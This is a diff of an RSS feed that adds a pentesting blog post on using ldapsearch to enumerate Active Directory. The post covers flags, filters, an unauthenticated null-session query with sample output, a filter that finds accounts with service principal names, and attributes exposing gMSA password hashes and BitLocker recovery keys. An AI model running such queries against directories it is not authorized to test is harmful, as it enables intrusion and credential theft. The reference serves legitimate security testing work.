@@ -5,10 +5,460 @@
     <description>Recent content in ldapsearch on malicious.link</description>
     <generator>Hugo -- gohugo.io</generator>
     <language>en-us</language>
-    <lastBuildDate>Mon, 24 Jul 2017 07:35:28 -0500</lastBuildDate>
+    <lastBuildDate>Sat, 14 May 2022 11:00:00 -0500</lastBuildDate>
     
         <atom:link href="https://malicious.link/tags/ldapsearch/index.xml" rel="self" type="application/rss+xml" />
     
+    
+    <item>
+      <title>LDAPSearch Reference</title>
+      <link>https://malicious.link/post/2022/ldapsearch-reference/</link>
+      <pubDate>Sat, 14 May 2022 11:00:00 -0500</pubDate>
+      
+      <guid>https://malicious.link/post/2022/ldapsearch-reference/</guid>
+      <description>&lt;p&gt;&lt;code&gt;ldapsearch&lt;/code&gt; is a extremely powerful tool, especially for Windows Active Directory enumeration. It&amp;rsquo;s one of my primary tools when performing pentesting or red teaming against an environment with Active Directory, but also comes in quiet handy to know as many times it can come default installed or part of a base image, so its a bit Living-Off-The-Land-esq. Another point towards ldapsearch is that it&amp;rsquo;s easy to forget that Active Directory isn&amp;rsquo;t the only LDAP server in most environments and the ability to utilize a tool like this can come in extremely handy.&lt;/p&gt;
+&lt;p&gt;If you want to find Active Directory LDAP servers, use the following command:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;$ dig -t SRV _ldap._tcp.dc._msdcs.sittingduck.info
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;basic-usage&#34;&gt;Basic Usage&lt;/h3&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;-x&lt;/code&gt; Basic Authentication, you usually use this if you are going to include a username and password (instead of something like a kerberos ticket)&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;-h&lt;/code&gt; IP address or hostname&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;-H&lt;/code&gt; URL to force protocol and/or add port number &lt;code&gt;-H ldaps://dc1.b.com&lt;/code&gt; or &lt;code&gt;-H ldaps://dc1.b.com:6636&lt;/code&gt; (636 is the default port for LDAPS, but can be connected to on 389 and is sometimes found with an additional 6 in the front as shown). &lt;code&gt;3269&lt;/code&gt; is the Global Catalog port and can also accept LDAPS queries sometimes (you may have to ignore cert errors for this to work, depending on your setup).&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;-b&lt;/code&gt; Base, generally this is Distinguished Name format for example &lt;code&gt;dc=google,dc=com&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;-D&lt;/code&gt; Username and Domain (not FQDN) &lt;code&gt;&amp;quot;sittingduck\uberuser&amp;quot;&lt;/code&gt;. For maximum Kerberos based authentication you can also specify your user in &lt;code&gt;uberuser@SITTINGDUCK.INFO&lt;/code&gt; form, but ldapsearch will auto user the current user in Kerberos tickets available, so this can be omitted&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;-LLL&lt;/code&gt; This removes all of the extra log output of the search&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;-Y GSSAPI&lt;/code&gt; Used for Kerberos based authentication, however this is on by default and not needed (if installed), but you can specify it just to test to see if SASL is installed. &lt;code&gt;apt install libsasl2-modules-gssapi-mit&lt;/code&gt; if it isn&amp;rsquo;t. Once installed, you do not need to keep this on the command line.&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;-E&lt;/code&gt; is for &lt;a href=&#34;https://ldapwiki.com/wiki/LDAPControlsList&#34;&gt;extended controls&lt;/a&gt; which are generally OIDs, but can also be:&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;-E pr=1000/noprompt&lt;/code&gt; By default &lt;code&gt;ldapsearch&lt;/code&gt; will pull 1000 records maximum. Adding this it will pull 1000 records at a time until it has printed all results to the screen.&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;-O minssf=0,maxssf=0&lt;/code&gt; This option will fix some errors during SASL (Kerberos) authentication. Technically this shouldn&amp;rsquo;t do anything based on the RFC, but it&amp;rsquo;s essentially telling the LDAP protocol that there isn&amp;rsquo;t a min or a max size for the authentication packets.&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;-o ldif-wrap=no&lt;/code&gt; This options makes the output non-wrapped, which is the best format to pull out things like certificates and other very long strings.&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;-W&lt;/code&gt; and &lt;code&gt;-w&lt;/code&gt; - &lt;code&gt;-W&lt;/code&gt; will prompt for the password, with &lt;code&gt;-w&lt;/code&gt; you can specify the password on the command line. If you do not specify one of these &lt;code&gt;ldapsearch&lt;/code&gt; will assume no password for the account. You can lock accounts out this way.&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;LDAPTLS_REQCERT=never ldapsearch {arguments}&lt;/code&gt; This is used when you are connecting to a self signed, or SSL enabled LDAP that your system cannot verify the certificate for.&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;-N&lt;/code&gt; Do not try to have the host name of your target DC attempted to perform a reverse DNS on the IP to match them. This is needed when the Domain Controller doesn&amp;rsquo;t have a valid reverse DNS record from your standpoint on the network and you are using Kerberos.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id=&#34;ldap-search-filters&#34;&gt;LDAP Search Filters&lt;/h3&gt;
+&lt;p&gt;After the arguments comes the filter, then the attributes. Filters are like search terms. For example &lt;code&gt;&amp;quot;(ms-Mcs-AdmPwdExpirationTtime=*)&amp;quot;&lt;/code&gt; is a search that says if the LDAP object has the &lt;code&gt;ms-Mcs-AdmPwdExpirationTtime&lt;/code&gt; attribute and it&amp;rsquo;s not empty. LDAP filters are a bit odd, as they need to be within parentheses completely. In order to do a search for &lt;code&gt;x&lt;/code&gt; AND &lt;code&gt;y&lt;/code&gt; you have to do something like this &lt;code&gt;(&amp;amp;(x=*)(y=*))&lt;/code&gt;. This search says only return results that have &lt;code&gt;x&lt;/code&gt; and &lt;code&gt;y&lt;/code&gt; and both are not empty. Here is a real world example:&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;&amp;#34;(&amp;amp;(&amp;amp;(servicePrincipalName=*)(UserAccountControl:1.2.840.113556.1.4.803:=512))(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))&amp;#34;
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;This says all objects that have &lt;code&gt;servicesPrincipalName&lt;/code&gt; attributes, it is a normal account (512) &lt;a href=&#34;https://docs.microsoft.com/en-us/troubleshoot/windows-server/identity/useraccountcontrol-manipulate-account-properties&#34;&gt;see more here&lt;/a&gt; AND is NOT &lt;code&gt;!&lt;/code&gt;  disabled (2).&lt;/p&gt;
+&lt;p&gt;Note: &lt;code&gt;1.2.840.113556.1.4.803&lt;/code&gt; is an LDAP feature that says &lt;code&gt;LDAP_MATCHING_RULE_BIT_AND&lt;/code&gt; which is basically a bitwise &lt;code&gt;AND&lt;/code&gt;. For example, a standard user account is &lt;code&gt;512&lt;/code&gt; but would be &lt;code&gt;514&lt;/code&gt; if disabled, but a computer account is &lt;code&gt;4096&lt;/code&gt; and &lt;code&gt;4098&lt;/code&gt; if disabled. Used the bitwise function you can account for both scenarios since it&amp;rsquo;s looking in the &lt;code&gt;2&lt;/code&gt; binary location.&lt;/p&gt;
+&lt;p&gt;Everything after the filter is selection of attributes. (also known as &amp;ldquo;parameters&amp;rdquo; if you are used to Powershell and AD Objects)&lt;/p&gt;
+&lt;h3 id=&#34;interesting-attributes&#34;&gt;Interesting Attributes&lt;/h3&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;msDS-Approx-Immed-Subordinates&lt;/code&gt; - Gives you a count of objects directly below the specified &amp;ldquo;Base&amp;rdquo; &lt;code&gt;-b&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;NTSecurityDescriptor&lt;/code&gt; - This is the SDSF in binary and base64 format, and will only be displayed if you request it specifically for the object.&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;msDS-ManagedPassword&lt;/code&gt; - This is a at-runtime built attribute that is the current NT hash of the Group Managed Service Account GMSA. &lt;strong&gt;!WARNING!&lt;/strong&gt; See below before querying.&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;msFVE-RecoveryPassword&lt;/code&gt; - This is also an at-runtine built attribute that is the current BitLocker secret key for the computer account you query. &lt;strong&gt;!WARNING!&lt;/strong&gt; See below before querying.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id=&#34;null-session-starting&#34;&gt;Null Session Starting&lt;/h3&gt;
+&lt;p&gt;This can be done without any authentication and will give you a ton of information about the LDAP server in question (usually Active Directory):&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;$ ldapsearch -h 192.168.80.100 -x -b &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt; -s base &lt;span style=&#34;color:#ae81ff&#34;&gt;\*&lt;/span&gt; +
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h4 id=&#34;example-output&#34;&gt;Example Output&lt;/h4&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# extended LDIF&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# LDAPv3&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# base &amp;lt;&amp;gt; with scope baseObject&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# filter: (objectclass=*)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# requesting: * + &lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;dn:
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;currentTime: 20220513212748.0Z
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;subschemaSubentry: CN&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;Aggregate,CN&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;Schema,CN&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;Configuration,DC&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;sittingduck,DC&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;i
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt; nfo
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;dsServiceName: CN&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;NTDS Settings,CN&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;DC2,CN&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;Servers,CN&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;Default-First-Site-Name,C
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt; N&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;Sites,CN&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;Configuration,DC&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;sittingduck,DC&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;info
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;namingContexts: DC&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;sittingduck,DC&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;info
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;namingContexts: CN&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;Configuration,DC&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;sittingduck,DC&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;info
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;namingContexts: CN&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;Schema,CN&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;Configuration,DC&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;sittingduck,DC&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;info
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;namingContexts: DC&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;DomainDnsZones,DC&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;sittingduck,DC&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;info
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;namingContexts: DC&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;ForestDnsZones,DC&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;sittingduck,DC&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;info
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;defaultNamingContext: DC&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;sittingduck,DC&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;info
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;schemaNamingContext: CN&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;Schema,CN&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;Configuration,DC&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;sittingduck,DC&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;info
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;configurationNamingContext: CN&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;Configuration,DC&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;sittingduck,DC&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;info
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;rootDomainNamingContext: DC&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;sittingduck,DC&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;info
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;supportedControl: 1.2.840.113556.1.4.319
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;supportedControl: 1.2.840.113556.1.4.801
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;supportedControl: 1.2.840.113556.1.4.473
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;supportedControl: 1.2.840.113556.1.4.528
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;supportedControl: 1.2.840.113556.1.4.417
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;supportedControl: 1.2.840.113556.1.4.619
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;supportedControl: 1.2.840.113556.1.4.841
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;supportedControl: 1.2.840.113556.1.4.529
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;supportedControl: 1.2.840.113556.1.4.805
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;supportedControl: 1.2.840.113556.1.4.521
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;supportedControl: 1.2.840.113556.1.4.970
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;supportedControl: 1.2.840.113556.1.4.1338
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;supportedControl: 1.2.840.113556.1.4.474
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;supportedControl: 1.2.840.113556.1.4.1339
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;supportedControl: 1.2.840.113556.1.4.1340
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;supportedControl: 1.2.840.113556.1.4.1413
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;supportedControl: 2.16.840.1.113730.3.4.9
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;supportedControl: 2.16.840.1.113730.3.4.10
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;supportedControl: 1.2.840.113556.1.4.1504
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;supportedControl: 1.2.840.113556.1.4.1852
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;supportedControl: 1.2.840.113556.1.4.802
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;supportedControl: 1.2.840.113556.1.4.1907
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;supportedControl: 1.2.840.113556.1.4.1948
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;supportedControl: 1.2.840.113556.1.4.1974
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;supportedControl: 1.2.840.113556.1.4.1341
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;supportedControl: 1.2.840.113556.1.4.2026
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;supportedControl: 1.2.840.113556.1.4.2064
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;supportedControl: 1.2.840.113556.1.4.2065
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;supportedControl: 1.2.840.113556.1.4.2066
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;supportedControl: 1.2.840.113556.1.4.2090
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;supportedControl: 1.2.840.113556.1.4.2205
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;supportedControl: 1.2.840.113556.1.4.2204
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;supportedControl: 1.2.840.113556.1.4.2206
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;supportedControl: 1.2.840.113556.1.4.2211
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;supportedControl: 1.2.840.113556.1.4.2239
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;supportedControl: 1.2.840.113556.1.4.2255
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;supportedControl: 1.2.840.113556.1.4.2256
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;supportedLDAPVersion: &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;supportedLDAPVersion: &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;supportedLDAPPolicies: MaxPoolThreads
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;supportedLDAPPolicies: MaxPercentDirSyncRequests
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;supportedLDAPPolicies: MaxDatagramRecv
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;supportedLDAPPolicies: MaxReceiveBuffer
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;supportedLDAPPolicies: InitRecvTimeout
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;supportedLDAPPolicies: MaxConnections
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;supportedLDAPPolicies: MaxConnIdleTime
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;supportedLDAPPolicies: MaxPageSize
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;supportedLDAPPolicies: MaxBatchReturnMessages
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;supportedLDAPPolicies: MaxQueryDuration
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;supportedLDAPPolicies: MaxTempTableSize
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;supportedLDAPPolicies: MaxResultSetSize
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;supportedLDAPPolicies: MinResultSets
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;supportedLDAPPolicies: MaxResultSetsPerConn
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;supportedLDAPPolicies: MaxNotificationPerConn
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;supportedLDAPPolicies: MaxValRange
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;supportedLDAPPolicies: MaxValRangeTransitive
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;supportedLDAPPolicies: ThreadMemoryLimit
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;supportedLDAPPolicies: SystemMemoryLimitPercent
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;highestCommittedUSN: &lt;span style=&#34;color:#ae81ff&#34;&gt;2830648&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;supportedSASLMechanisms: GSSAPI
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;supportedSASLMechanisms: GSS-SPNEGO
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;supportedSASLMechanisms: EXTERNAL
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;supportedSASLMechanisms: DIGEST-MD5
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;dnsHostName: dc2.sittingduck.info
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;ldapServiceName: sittingduck.info:dc2$@SITTINGDUCK.INFO
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;serverName: CN&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;DC2,CN&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;Servers,CN&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;Default-First-Site-Name,CN&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;Sites,CN&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;Configura
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt; tion,DC&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;sittingduck,DC&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;info
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;supportedCapabilities: 1.2.840.113556.1.4.800
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;supportedCapabilities: 1.2.840.113556.1.4.1670
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;supportedCapabilities: 1.2.840.113556.1.4.1791
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;supportedCapabilities: 1.2.840.113556.1.4.1935
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;supportedCapabilities: 1.2.840.113556.1.4.2080
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;supportedCapabilities: 1.2.840.113556.1.4.2237
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;isSynchronized: TRUE
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;isGlobalCatalogReady: TRUE
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;domainFunctionality: &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;forestFunctionality: &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;domainControllerFunctionality: &lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# search result&lt;/span&gt;
